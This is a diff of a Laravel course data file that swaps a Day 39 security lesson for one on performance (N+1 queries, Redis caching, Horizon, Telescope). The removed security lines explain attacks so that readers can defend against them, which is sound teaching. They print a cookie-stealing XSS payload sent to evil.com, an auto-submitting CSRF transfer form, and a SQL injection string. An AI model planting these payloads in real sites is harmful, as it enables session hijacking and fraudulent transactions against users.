@@ -3,336 +3,330 @@ import type { RoadmapDayDetail } from "@/lib/challenge-data";
 export const LARAVEL_DAY_39_DETAIL: RoadmapDayDetail = {
   overview: [
     {
-      en: "Security is not a feature you bolt on at the end — it is built into every layer from day one.\n\nThink of a bank:\n• <b>ID check at the door</b> — authentication (Breeze, Sanctum from Day 17)\n• <b>Cameras watching every aisle</b> — logging and auditing\n• <b>Time locks on safe-deposit boxes</b> — rate limiting (throttle middleware)\n• <b>Bulletproof glass at tills</b> — input validation (Day 9)\n• <b>Serial numbers on every form</b> — CSRF tokens\n\nLaravel has <b>built-in defences for every one of these layers</b>. Today we learn how each attack works in plain English, and how to stop it.",
-      np: "Security = layered defence। Laravel मा CSRF, XSS, SQL injection, mass assignment, rate limiting सबैको built-in protection।",
-      jp: "セキュリティは後付けではなく全層に組み込む。CSRF・XSS・SQLi・マスアサイン・レート制限を解説。",
+      en: "A slow app is a broken app — users leave pages that take more than 3 seconds to load, and search engines penalise slow sites. Performance in Laravel is mostly about three things: <b>database queries</b> (too many, or poorly structured), <b>caching</b> (not caching what you could), and <b>background work</b> (doing expensive work synchronously that could run in a queue). Most apps have at least one of these problems by default.",
+      np: "Slow app = broken app। Laravel performance: database queries optimize गर्नुस्, caching प्रयोग गर्नुस्, expensive work queue मा पठाउनुस्।",
+      jp: "遅いアプリは壊れたアプリ。Laravel のパフォーマンスは主に DB クエリ・キャッシュ・バックグラウンド処理の 3 点。",
     },
     {
-      en: "The 5 attack types we cover today — in plain English:\n\n• <b>CSRF</b> — an attacker tricks your logged-in user's browser into silently making a request your app thinks is legitimate\n  ↳ Defence: unique hidden token in every form that only your server knows\n• <b>XSS</b> — an attacker injects JavaScript into your page that runs in other users' browsers\n  ↳ Defence: always escape output; Blade's `{{ }}` does this automatically\n• <b>SQL injection</b> — an attacker sends data that escapes your query and runs their own SQL\n  ↳ Defence: Eloquent and Query Builder use PDO prepared statements everywhere\n• <b>Mass assignment</b> — an attacker submits extra fields (like `is_admin=true`) your app saves without checking\n  ↳ Defence: `$fillable` whitelist on every model\n• <b>Brute force / rate limiting</b> — an attacker tries thousands of passwords per second\n  ↳ Defence: `throttle` middleware capping requests per time window",
-      np: "CSRF, XSS, SQL injection, mass assignment, rate limiting — हरेकको attack र defence।",
-      jp: "CSRF・XSS・SQLi・マスアサイン・レート制限の攻撃手法と Laravel の防御策。",
+      en: "<b>N+1 query problem</b> — the single most common performance bug in Laravel apps\n↳ One query to get 100 posts, then 100 queries to get each post's author = 101 queries\n\n<b>Eager loading & withCount</b> — solving N+1 with `with()` and `withCount()`\n↳ Two queries instead of 101, regardless of how many records you have\n\n<b>Query debugging</b> — Laravel Telescope and Debugbar to spot slow queries\n↳ See every query, its execution time, and where it was called from\n\n<b>Redis caching</b> — caching query results, computed values, and sessions\n↳ ~1ms Redis read vs ~50ms database query\n\n<b>Laravel Horizon</b> — queue monitoring, worker scaling, and failure tracking\n↳ Dashboard showing throughput, wait time, and failed job stack traces",
+      np: "N+1 problem, eager loading, Telescope, Redis caching, Horizon — यी 5 topics cover हुन्छन्।",
+      jp: "N+1 問題、Eager ロード、Telescope、Redis キャッシュ、Horizon の 5 トピックを学ぶ。",
     },
   ],
   sections: [
     {
       title: {
-        en: "CSRF — Cross-Site Request Forgery",
-        np: "CSRF",
-        jp: "CSRF（クロスサイトリクエストフォージェリ）",
+        en: "The N+1 query problem",
+        np: "N+1 query problem",
+        jp: "N+1 クエリ問題",
       },
       blocks: [
         {
           type: "paragraph",
           text: {
-            en: "<b>How CSRF works:</b>\n\nImagine you are logged in to your bank at `mybank.com`. Your browser holds a session cookie. You then visit `evil-site.com`, which has this hidden form:\n\n`<form action=\"https://mybank.com/transfer\" method=\"POST\"><input name=\"to\" value=\"attacker\"><input name=\"amount\" value=\"9999\"></form>`\n\nWhen the page loads, a script auto-submits the form. Your browser <b>automatically sends the session cookie</b> with the POST — the bank sees a valid session and processes the transfer.\n\n<b>Laravel's defence:</b> Every form gets a unique secret token (`_token`) generated per session. The malicious site cannot read this token (same-origin policy), so its fake request is rejected.\n\n↳ Blade's `@csrf` directive injects the hidden `_token` field automatically.",
-            np: "CSRF = attacker ले user को browser बाट silently POST गराउँछ। Defence: session-specific `_token`।",
-            jp: "CSRF は攻撃者が他サイトから被害者のブラウザで POST させる攻撃。`@csrf` で防御。",
+            en: "<b>N+1</b> is when you run 1 query to get a list of records, then run 1 more query for EACH record to fetch related data. With 100 posts, that is 101 database round trips instead of 2.\n\nIt's named \"N+1\" because:\n• 1 query to get the list (the \"1\")\n• N queries to get each item's related data (the \"N\")\n• Total: N+1 queries\n\nEach round trip has overhead: network latency, connection setup, query parsing, index lookup. At scale this tanks response time. A page that loads in 50ms with 10 items takes 5 seconds with 1,000 items.",
+            np: "N+1 = 1 query list लिन + N queries प्रत्येक item को related data लिन। 100 posts = 101 queries! Eager loading ले यो fix गर्छ।",
+            jp: "N+1 は 1 回のリスト取得 + N 回の関連データ取得。100 件で 101 クエリ。Eager loading で解決。",
           },
         },
         {
           type: "code",
-          title: {
-            en: "Blade @csrf + excluding webhook routes",
-            np: "@csrf directive र webhook exclusion",
-            jp: "@csrf と Webhook 除外",
-          },
-          code: `{{-- resources/views/posts/create.blade.php --}}
-<form method="POST" action="/posts">
-    @csrf   {{-- injects <input type="hidden" name="_token" value="..."> --}}
+          title: { en: "N+1 problem and the fix", np: "N+1 र fix", jp: "N+1 と解決策" },
+          code: `// BAD — N+1 problem (101 queries for 100 posts)
+$posts = Post::all(); // 1 query
+foreach ($posts as $post) {
+    echo $post->author->name; // 1 query per post = 100 more queries
+    echo $post->comments->count(); // another 100 queries!
+}
 
-    <input type="text" name="title">
-    <button type="submit">Create Post</button>
-</form>
+// GOOD — Eager loading (3 queries total, regardless of count)
+$posts = Post::with(['author', 'comments'])->get();
+// Query 1: SELECT * FROM posts
+// Query 2: SELECT * FROM users WHERE id IN (1, 2, 3, ...)
+// Query 3: SELECT * FROM comments WHERE post_id IN (1, 2, 3, ...)
 
-// Excluding routes that receive external webhooks
-// app/Http/Middleware/VerifyCsrfToken.php
-protected $except = [
-    'stripe/webhook',
-    'github/webhook',
-    // Add external webhook routes here ONLY
-];
+// BETTER — withCount when you only need the count, not the records
+$posts = Post::with('author')->withCount('comments')->get();
+// $post->comments_count is now available as a virtual column
+// Only 2 queries total — no loading all comment rows into memory
 
-// API routes (routes/api.php) do NOT have CSRF middleware by default.
-// They use Sanctum token auth instead — tokens prove identity better than cookies.`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>When is it safe to exclude a route from CSRF?</b>\n\nOnly exclude routes that receive requests from <b>external systems that cannot hold a session</b>:\n• Payment gateway webhooks (Stripe, PayPal)\n• Version control webhooks (GitHub, GitLab)\n• Third-party service callbacks\n\n<b>Never exclude:</b>\n• Login, register, password reset\n• Any user-facing form\n• Any route that modifies user data\n\n↳ Do NOT remove `VerifyCsrfToken` from your middleware stack entirely — that disables protection for all web routes. Use `$except` for surgical exclusions only.",
-            np: "CSRF exclude: external webhooks मात्र। Login/register/forms कहिल्यै exclude नगर्नुहोस्।",
-            jp: "CSRF 除外は外部 Webhook のみ。ログイン・フォームは絶対に除外しない。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "XSS — Cross-Site Scripting",
-        np: "XSS",
-        jp: "XSS（クロスサイトスクリプティング）",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>How XSS works:</b>\n\nAn attacker stores this in a blog comment: `<script>document.location='https://evil.com?c='+document.cookie</script>`\n\nIf your app renders that comment as raw HTML, <b>every visitor's browser runs the script</b> — their session cookies are stolen and sent to the attacker.\n\nXSS can:\n• Steal session cookies and hijack accounts\n• Redirect users to phishing pages\n• Inject keyloggers to capture passwords\n• Deface your site for all visitors\n\n<b>Laravel's defence:</b> Blade's `{{ }}` syntax <b>auto-escapes HTML entities</b> — `<script>` becomes `&lt;script&gt;` which the browser displays as text, not code.\n\n↳ The only dangerous syntax is `{!! !!}` which renders raw, unescaped HTML.",
-            np: "XSS = attacker ले JS inject गर्छ — cookies चोर्न, redirect गर्न। Defence: `{{ }}` auto-escape।",
-            jp: "XSS は悪意ある JS を注入する攻撃。Blade `{{ }}` が HTML を自動エスケープして防御。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "Safe vs dangerous Blade output + HTMLPurifier",
-            np: "Safe `{{ }}` vs dangerous `{!! !!}`",
-            jp: "安全な出力と危険な出力",
-          },
-          code: `{{-- SAFE — Blade escapes HTML entities automatically --}}
-{{ $user->bio }}
-{{-- If bio = "<script>alert('xss')</script>" --}}
-{{-- Rendered as: &lt;script&gt;alert('xss')&lt;/script&gt; --}}
-
-{{-- DANGEROUS — renders raw HTML without escaping --}}
-{!! $user->bio !!}
-{{-- If bio = "<script>alert('xss')</script>" --}}
-{{-- Browser EXECUTES the script --}}
-
-{{-- SAFE — strip all HTML tags before display --}}
-{{ strip_tags($user->bio) }}
-
-{{-- SAFE — for rich text editors: use HTMLPurifier to allow SAFE HTML --}}
-{{-- composer require ezyang/htmlpurifier --}}
-$config = HTMLPurifier_Config::createDefault();
-$purifier = new HTMLPurifier($config);
-$safeHtml = $purifier->purify($request->input('body'));
-
-// Only use {!! !!} for content YOU generate — never for user input
-{!! $markdown->toHtml($post->body) !!} // OK: markdown renderer output`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>The rule is simple:</b>\n\n• Always use `{{ }}` — it is safe by default\n• Never use `{!! !!}` for user-generated content without running it through HTMLPurifier first\n\n<b>Legitimate uses for `{!! !!}`:</b>\n• A Markdown renderer you control (input comes from your database, not users directly)\n• Generated SVG or chart HTML\n• Localised content from a trusted CMS your team manages\n\n<b>Content Security Policy (CSP)</b> adds a second layer:\n• A CSP header tells the browser to only execute scripts from your own domain\n• Even if an attacker injects `<script src=\"evil.com/xss.js\">`, the browser blocks it\n  ↳ We cover CSP headers in Section 5",
-            np: "`{{ }}` = always safe। `{!! !!}` = user content मा HTMLPurifier पछि मात्र।",
-            jp: "`{{ }}` は常に安全。`{!! !!}` はユーザー入力に直接使わない。CSP ヘッダーで多重防御。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "SQL injection & mass assignment protection",
-        np: "SQL injection र mass assignment",
-        jp: "SQL インジェクションとマスアサイン",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>SQL injection in plain English:</b>\n\nImagine a login form. You type your email: `admin@site.com` and the app builds: `SELECT * FROM users WHERE email = 'admin@site.com'`\n\nAn attacker types: `' OR '1'='1` — the app builds: `SELECT * FROM users WHERE email = '' OR '1'='1'` — this always returns ALL users. The attacker is logged in as the first user (often an admin).\n\n<b>Why Eloquent is safe by default:</b> Eloquent and the Query Builder use <b>PDO prepared statements</b>. User input is passed as a parameter (a `?` placeholder), never concatenated into the SQL string. The database treats it as data, never as code.\n\n<b>Mass assignment in plain English:</b> If you `User::create($request->all())`, whatever fields the user submits get saved — including `is_admin`, `role`, or `balance`. An attacker can submit any column name.",
-            np: "SQL injection: string concatenation खतरनाक। Eloquent PDO prepared statements प्रयोग गर्छ — safe। Mass assignment: `$fillable` define गर्नुहोस्।",
-            jp: "Eloquent は PDO 準備文でSQLi を防ぐ。マスアサインは `$fillable` ホワイトリストで守る。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "Safe vs unsafe queries + mass assignment protection",
-            np: "Safe queries र mass assignment",
-            jp: "安全なクエリとマスアサイン防御",
-          },
-          code: `// ❌ DANGEROUS — string interpolation, SQL injection possible
-$email = $request->input('email');
-DB::statement("SELECT * FROM users WHERE email = '$email'");
-
-// ✅ SAFE — PDO prepared statement, user input is bound as data
-User::where('email', $email)->first();
-
-// ✅ SAFE — manual binding (use when raw SQL is truly necessary)
-DB::select('SELECT * FROM users WHERE email = ?', [$email]);
-DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);
-
-// ── Mass assignment ─────────────────────────────────────────────
-
-// ❌ DANGEROUS — saves every field the user submits, including is_admin
-User::create($request->all());
-
-// ✅ SAFE — only allow the fields we explicitly permit
-User::create($request->only(['name', 'email', 'password']));
-
-// ✅ SAFE — $fillable whitelist on the model
-class User extends Model
-{
-    // Only these columns can be mass-assigned
-    protected $fillable = ['name', 'email', 'password'];
-
-    // ❌ NEVER do this in production — disables all mass assignment protection
-    // protected $guarded = [];
+// DETECT N+1 in development — add to AppServiceProvider::boot()
+if (app()->isLocal()) {
+    \\Illuminate\\Database\\Eloquent\\Model::preventLazyLoading(true);
+    // Now Laravel throws an exception instantly when lazy loading is detected
 }`,
         },
         {
           type: "paragraph",
           text: {
-            en: "<b>Mass assignment rules:</b>\n\n• `$fillable` is a <b>whitelist</b> — only named columns can be set via `create()` or `fill()`\n• `$guarded` is a <b>blacklist</b> — columns listed here are blocked, everything else is allowed\n• `$guarded = []` means <b>no protection at all</b> — never use in production\n\n<b>The safe default:</b> define `$fillable` on every model that accepts user input. Be explicit about what users are allowed to set.\n\n↳ Validation (Day 9) catches <b>invalid values</b>. Mass assignment protection catches <b>extra fields</b> you never intended users to control. Both are necessary.",
-            np: "`$fillable` = whitelist (safe)। `$guarded = []` = no protection (खतरनाक)।",
-            jp: "`$fillable` はホワイトリスト。`$guarded = []` は全解除で危険。本番では必ず `$fillable` を定義。",
+            en: "The `preventLazyLoading(true)` call is the single most effective way to catch N+1 before it reaches production. It throws a `LazyLoadingViolationException` with the model name and relationship that was lazily loaded, so you can fix it immediately.\n\nUseful variants:\n• `Post::with(['author:id,name', 'tags:id,name'])` — only load specific columns from related models\n• `Post::with(['comments' => fn($q) => $q->latest()->limit(3)])` — constrain eager load queries\n• `$posts->load('author')` — eager load on an already-retrieved collection",
+            np: "`preventLazyLoading(true)` production deployment अघि N+1 catch गर्ने best tool हो।",
+            jp: "`preventLazyLoading(true)` は N+1 を本番前に検出する最良の方法。関係の制約にも対応。",
           },
         },
       ],
     },
     {
       title: {
-        en: "Rate limiting & brute-force protection",
-        np: "Rate limiting",
-        jp: "レート制限とブルートフォース対策",
+        en: "Query optimization — indexes, select & chunking",
+        np: "Query optimization — indexes, select र chunking",
+        jp: "クエリ最適化 — インデックス・select・チャンク",
       },
       blocks: [
         {
           type: "paragraph",
           text: {
-            en: "<b>Why rate limiting matters:</b>\n\nWithout it:\n• A bot can try 86,400 different passwords per second on your login form\n• A competitor can scrape your entire product catalogue in seconds\n• A DDoS attack can hammer a single endpoint and crash your server\n\nRate limiting <b>caps how many requests</b> a user (or IP) can make in a time window. Exceed the limit → `429 Too Many Requests`.\n\n<b>Two levels in Laravel:</b>\n• <b>Built-in `throttle` middleware</b> — quick to add, good for most cases\n• <b>`RateLimiter` facade</b> — custom logic (per-user, per-IP, per-subscription tier)",
-            np: "Rate limiting: bot attacks, scraping, DDoS रोक्न। `throttle` middleware वा `RateLimiter` facade।",
-            jp: "レート制限はボット攻撃・スクレイピング・DDoS を防ぐ。`throttle` や `RateLimiter` を使う。",
+            en: "Even with N+1 solved, individual queries can be slow. Three common causes:\n\n• <b>Missing indexes</b> — without an index, the database reads every row to find matches\n  ↳ Think of it like a book with no index — you'd read every page to find a word\n  ↳ Add indexes on columns you filter (`WHERE`), sort (`ORDER BY`), or join on\n• <b>Selecting too many columns</b> — `SELECT *` loads every column even if you use only 2\n  ↳ A `posts` table with a `body` TEXT column sends megabytes of data you don't render\n• <b>Loading too many rows at once</b> — `Post::all()` on a million-row table exhausts PHP memory",
+            np: "Missing indexes, SELECT *, र large datasets — यी तीन common query performance issues हुन्।",
+            jp: "インデックス不足・SELECT * による過剰取得・大量行ロードが遅いクエリの主な原因。",
           },
         },
         {
           type: "code",
-          title: {
-            en: "throttle middleware + custom RateLimiter",
-            np: "throttle र custom RateLimiter",
-            jp: "throttle ミドルウェアとカスタム RateLimiter",
-          },
-          code: `// routes/web.php — simple throttle: 5 attempts per 1 minute
-Route::post('/login', [LoginController::class, 'store'])
-    ->middleware('throttle:5,1');
-
-// routes/api.php — 60 requests per minute for API
-Route::middleware(['auth:sanctum', 'throttle:api'])->group(function () {
-    Route::apiResource('posts', PostController::class);
+          title: { en: "Indexes, column selection & chunking", np: "Indexes, select, chunk", jp: "インデックス・select・チャンク" },
+          code: `// INDEXES — add to your migrations
+Schema::table('posts', function (Blueprint $table) {
+    $table->index('user_id');                        // single column
+    $table->index(['user_id', 'published_at']);      // composite (queries filter both)
+    $table->index('published_at');                   // for ORDER BY published_at DESC
 });
 
-// Define named rate limiters in AppServiceProvider::boot()
-use Illuminate\\Support\\Facades\\RateLimiter;
-use Illuminate\\Cache\\RateLimiting\\Limit;
+// COLUMN SELECTION — only load what you need
+Post::select(['id', 'title', 'published_at', 'user_id'])
+    ->with('author:id,name')  // constrain relation columns too
+    ->get();
 
-RateLimiter::for('api', function (Request $request) {
-    return Limit::perMinute(60)
-                ->by($request->user()?->id ?: $request->ip());
-});
-
-// Tiered limiting — more requests for premium users
-RateLimiter::for('uploads', function (Request $request) {
-    return $request->user()->isPremium()
-        ? Limit::perHour(500)->by($request->user()->id)
-        : Limit::perHour(50)->by($request->user()->id);
-});
-
-// When the limit is hit, Laravel automatically returns:
-// HTTP 429 Too Many Requests
-// Headers: Retry-After: 60, X-RateLimit-Remaining: 0`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>What happens when the limit is hit:</b>\n\nLaravel returns `429 Too Many Requests` automatically. The response includes:\n• `Retry-After: 60` — how many seconds until the limit resets\n• `X-RateLimit-Limit: 5` — the maximum allowed requests\n• `X-RateLimit-Remaining: 0` — remaining requests in the window\n\n<b>Recommended limits for common endpoints:</b>\n• Login / register: `throttle:5,1` (5 per minute — aggressive brute-force protection)\n• Password reset: `throttle:3,1` (3 per minute)\n• General API: `throttle:60,1` (60 per minute per user)\n• Public search: `throttle:30,1` (30 per minute per IP)\n\n↳ For advanced protection, use a dedicated package like `laravel-security` or put a WAF (Cloudflare, AWS WAF) in front of your app.",
-            np: "429 response मा `Retry-After` header। Login: 5/min, API: 60/min, Search: 30/min।",
-            jp: "制限超過で 429。`Retry-After` ヘッダーで再試行タイミングを通知。エンドポイント別に設定推奨。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "Security headers & Content Security Policy",
-        np: "Security headers",
-        jp: "セキュリティヘッダーとCSP",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>Security headers</b> are HTTP response headers that tell the browser how to behave — like safety rules posted on the wall.\n\nWithout them, browsers allow by default:\n• Your page to be embedded in iframes on other sites (<b>clickjacking</b>)\n• Mixed HTTP/HTTPS content (downgrades TLS protection)\n• Scripts loaded from any domain (XSS amplified)\n• Browser sniffing your content type (MIME sniffing attacks)\n\nAdding security headers <b>costs you nothing</b> (a single middleware) and prevents entire categories of attack that would otherwise require complex code fixes.",
-            np: "Security headers = browser लाई safety rules। Clickjacking, MIME sniffing, mixed content रोक्छ।",
-            jp: "セキュリティヘッダーはブラウザへの安全規則。クリックジャッキング・MIME スニッフィングを防ぐ。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "SecurityHeaders middleware — create and register",
-            np: "SecurityHeaders middleware",
-            jp: "セキュリティヘッダーミドルウェア",
-          },
-          code: `<?php
-// app/Http/Middleware/SecurityHeaders.php
-namespace App\\Http\\Middleware;
-
-use Closure;
-use Illuminate\\Http\\Request;
-
-class SecurityHeaders
-{
-    public function handle(Request $request, Closure $next): mixed
-    {
-        $response = $next($request);
-
-        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
-        $response->headers->set('X-Content-Type-Options', 'nosniff');
-        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
-        $response->headers->set('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
-        $response->headers->set(
-            'Content-Security-Policy',
-            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
-        );
-
-        return $response;
+// CHUNKING — process large tables without exhausting memory
+// chunk(): loads 500 rows at a time
+Post::chunk(500, function (\\Illuminate\\Support\\Collection $posts) {
+    foreach ($posts as $post) {
+        // process each post
     }
+});
+
+// cursor(): memory-efficient generator (one row at a time)
+// Good for very large tables; holds DB connection open throughout
+foreach (Post::cursor() as $post) {
+    // process each post
 }
 
-// Register globally in bootstrap/app.php (Laravel 11)
-->withMiddleware(function (Middleware $middleware) {
-    $middleware->append(SecurityHeaders::class);
-})`,
+// LOG ALL QUERIES in development
+\\DB::enableQueryLog();
+$posts = Post::with('author')->get();
+$queries = \\DB::getQueryLog();
+// $queries is an array of ['query' => '...', 'bindings' => [...], 'time' => 1.23]
+
+// Use DB::listen() for live logging
+\\DB::listen(function ($query) {
+    if ($query->time > 100) { // log queries slower than 100ms
+        logger()->warning("Slow query: {$query->sql}", ['time' => $query->time]);
+    }
+});`,
         },
         {
-          type: "table",
-          caption: {
-            en: "Key security headers — what they do and the recommended value",
-            np: "Security headers cheat-sheet",
-            jp: "セキュリティヘッダー一覧",
+          type: "paragraph",
+          text: {
+            en: "For production query analysis, install Laravel Telescope (`composer require laravel/telescope --dev`) — it records every query with its SQL, bindings, execution time, and the exact line of code that triggered it. It also highlights slow queries in red. Never run Telescope in production without restricting access to admin IPs.",
+            np: "Production मा Laravel Telescope install गर्नुस् — सबै queries देखिन्छन् execution time सहित।",
+            jp: "本番のクエリ分析には Laravel Telescope を使用。SQL・実行時間・呼び出し元を記録し、遅いクエリを赤でハイライト。",
           },
-          headers: [
-            { en: "Header", np: "Header", jp: "ヘッダー" },
-            { en: "What it prevents", np: "के रोक्छ", jp: "防ぐ攻撃" },
-            { en: "Recommended value", np: "सिफारिस value", jp: "推奨値" },
-          ],
-          rows: [
-            [
-              { en: "X-Frame-Options", np: "X-Frame-Options", jp: "X-Frame-Options" },
-              { en: "Clickjacking — embedding your site in a hidden iframe", np: "Clickjacking", jp: "クリックジャッキング" },
-              { en: "`SAMEORIGIN`", np: "`SAMEORIGIN`", jp: "`SAMEORIGIN`" },
-            ],
-            [
-              { en: "X-Content-Type-Options", np: "X-Content-Type-Options", jp: "X-Content-Type-Options" },
-              { en: "MIME sniffing — browser guessing content type and running scripts", np: "MIME sniffing", jp: "MIME スニッフィング" },
-              { en: "`nosniff`", np: "`nosniff`", jp: "`nosniff`" },
-            ],
-            [
-              { en: "Content-Security-Policy", np: "CSP", jp: "CSP" },
-              { en: "XSS via inline scripts or external script sources", np: "XSS", jp: "XSS（スクリプト注入）" },
-              { en: "`default-src 'self'`", np: "`default-src 'self'`", jp: "`default-src 'self'`" },
-            ],
-            [
-              { en: "Strict-Transport-Security", np: "HSTS", jp: "HSTS" },
-              { en: "HTTP downgrade attacks — forcing HTTPS", np: "HTTP downgrade", jp: "HTTP ダウングレード攻撃" },
-              { en: "`max-age=31536000; includeSubDomains`", np: "max-age=31536000", jp: "max-age=31536000" },
-            ],
-            [
-              { en: "Referrer-Policy", np: "Referrer-Policy", jp: "Referrer-Policy" },
-              { en: "Information leakage in the Referer header to third parties", np: "Referer leakage", jp: "リファラ情報漏洩" },
-              { en: "`strict-origin-when-cross-origin`", np: "strict-origin-when-cross-origin", jp: "strict-origin-when-cross-origin" },
-            ],
-          ],
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Caching with Redis",
+        np: "Redis caching",
+        jp: "Redis によるキャッシュ",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Caching means storing the result of an expensive operation so you can reuse it without re-computing. <b>Redis</b> is an in-memory key-value store — reads take ~1ms vs ~50ms for a database query.\n\nAnalogy: Redis is like keeping a sticky note on your desk (instant) vs going to the filing cabinet (slower) vs going to the library archive (slowest).\n\nUse Redis for:\n• Frequently-read data that changes rarely (featured posts, nav menus, config)\n• Computed aggregates (leaderboards, total counts)\n• Sessions (faster than database sessions)\n• Rate limiting (Laravel's throttle middleware uses Redis by default)\n• Queue backend (jobs stored in Redis, consumed by workers)",
+            np: "Redis = in-memory key-value store। ~1ms read। Frequently-read data, sessions, queues, rate limiting मा प्रयोग गर्नुस्।",
+            jp: "Redis はメモリ内 KV ストア。読み取り約 1ms。頻繁に読まれるデータ・セッション・キュー・レート制限に活用。",
+          },
+        },
+        {
+          type: "code",
+          title: { en: "Cache::remember, tags & invalidation", np: "Cache examples", jp: "キャッシュの例" },
+          code: `// Basic caching — compute on miss, serve from cache on hit
+$posts = Cache::remember('posts.featured', 3600, function () {
+    return Post::featured()->with('author')->orderByDesc('views')->limit(10)->get();
+});
+// 3600 = TTL in seconds (1 hour)
+
+// Invalidate when data changes (e.g. in PostObserver)
+public function updated(Post $post): void
+{
+    Cache::forget('posts.featured');
+}
+
+// Tag-based invalidation — requires Redis (not available with file driver)
+// Cache all post-related data under the 'posts' tag
+$featured = Cache::tags(['posts'])->remember('featured', 3600, fn() => ...);
+$trending = Cache::tags(['posts'])->remember('trending', 1800, fn() => ...);
+
+// Invalidate ALL post caches at once
+Cache::tags(['posts'])->flush();
+
+// Per-user cache (prevents cache key collisions)
+$key = "user:{$userId}:dashboard";
+$dashboard = Cache::remember($key, 600, fn() => buildDashboard($userId));
+
+// Store arbitrary data
+Cache::put('maintenance_mode', true, 300); // expires in 5 minutes
+Cache::forever('app_version', '2.4.1');    // no expiry
+$value = Cache::get('app_version', 'unknown'); // default if missing
+
+// .env configuration
+// CACHE_DRIVER=redis
+// REDIS_HOST=127.0.0.1
+// REDIS_PORT=6379
+// SESSION_DRIVER=redis  (store sessions in Redis)`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>Cache key naming rules</b>:\n• Be specific: `posts.featured` is wrong if multiple tenants share a cache\n• Include IDs: `\"user:{$userId}:posts\"` instead of `\"user_posts\"`\n• Include version if the data structure changes: `\"posts.v2.featured\"`\n• Set sensible TTLs — cache that never expires grows forever and goes stale\n\n<b>When NOT to cache</b>:\n• Data that must be real-time (inventory counts, account balances)\n• Data that changes on every request without a user-specific key\n• Tiny queries that are already fast (single-row primary key lookups — DB buffers those itself)",
+            np: "Cache key naming: specific र unique राख्नुस्। TTL sensible राख्नुस्। Inventory/balance जस्ता real-time data cache नगर्नुस्।",
+            jp: "キャッシュキーは具体的かつユニークに。TTL を適切に設定。在庫・残高などリアルタイムデータはキャッシュ不可。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Laravel Horizon — queue monitoring & scaling",
+        np: "Laravel Horizon — queue monitoring",
+        jp: "Laravel Horizon — キュー監視とスケーリング",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Horizon is a dashboard and process manager for Laravel queues. Without it, you manage queue workers manually — launching them with supervisor, guessing how many you need, flying blind when jobs fail.\n\nHorizon gives you:\n• Live dashboard with jobs-per-minute, wait time, throughput\n• Failed jobs with full stack traces and retry button\n• Auto-balancing workers across queues based on real load\n• Slack/email alerts when jobs fail or queues back up",
+            np: "Horizon = queue dashboard + process manager। Failed jobs, throughput, auto-balancing — सबै एकै ठाउँमा।",
+            jp: "Horizon はキューのダッシュボード＋プロセスマネージャー。失敗ジョブ・スループット・自動バランスを一元管理。",
+          },
+        },
+        {
+          type: "code",
+          title: { en: "Horizon setup & config", np: "Horizon setup", jp: "Horizon セットアップ" },
+          code: `// Install
+composer require laravel/horizon
+php artisan horizon:install
+php artisan migrate  // creates horizon tables
+
+// config/horizon.php — define worker environments
+'environments' => [
+    'production' => [
+        'supervisor-1' => [
+            'connection'   => 'redis',
+            'queue'        => ['high', 'default', 'low'],
+            'balance'      => 'auto',     // smart auto-scaling
+            'maxProcesses' => 10,         // max total worker processes
+            'memory'       => 128,        // MB per worker (restart if exceeded)
+            'timeout'      => 60,         // job time limit in seconds
+            'tries'        => 3,          // retry failed jobs 3 times
+        ],
+    ],
+    'local' => [
+        'supervisor-1' => [
+            'connection'   => 'redis',
+            'queue'        => ['default'],
+            'balance'      => 'simple',
+            'maxProcesses' => 3,
+        ],
+    ],
+],
+
+// Run Horizon
+php artisan horizon         // start in foreground (dev)
+php artisan horizon:status  // check if running
+php artisan horizon:pause   // pause all workers
+php artisan horizon:continue
+
+// Prioritise critical jobs
+SendWelcomeEmail::dispatch($user)->onQueue('high');
+GenerateReport::dispatch($data)->onQueue('low');
+
+// Supervisor config for production (/etc/supervisor/conf.d/horizon.conf)
+// [program:horizon]
+// command=php /var/www/artisan horizon
+// autostart=true
+// autorestart=true
+// user=www-data`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "`balance: auto` monitors each queue's depth and spins up more workers for queues with a backlog — it responds to real load rather than distributing blindly. Key settings:\n• `maxProcesses` — set to your server's CPU count (not total RAM)\n• `memory: 128` — worker restarts after using 128MB, preventing gradual memory leaks\n• `tries: 3` — retries a failing job 3 times before marking it as \"failed\"\n• `timeout: 60` — kills a job that runs longer than 60 seconds (prevents zombie workers)\n\nAlways monitor the Horizon dashboard after a new deployment — a new bug can cause jobs to fail silently without Horizon.",
+            np: "`balance: auto` real load हेरेर workers थप्छ। `maxProcesses`, `memory`, `tries`, `timeout` सेट गर्नुस्।",
+            jp: "`balance: auto` はキューの深さに応じてワーカーを増減。`maxProcesses`・`memory`・`tries`・`timeout` を適切に設定。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Telescope — profiling in development",
+        np: "Telescope — development debugging",
+        jp: "Telescope — 開発時のプロファイリング",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Laravel Telescope is a development debugging dashboard. It records every request, query, job, mail, notification, cache hit/miss, schedule firing, and exception — with full context.\n\nAnalogy: it's like having a flight data recorder for your application — when something goes wrong, you replay exactly what happened.\n\nInstall it in development only — never in production without IP restrictions, as it exposes sensitive request data, query results, and environment variables.",
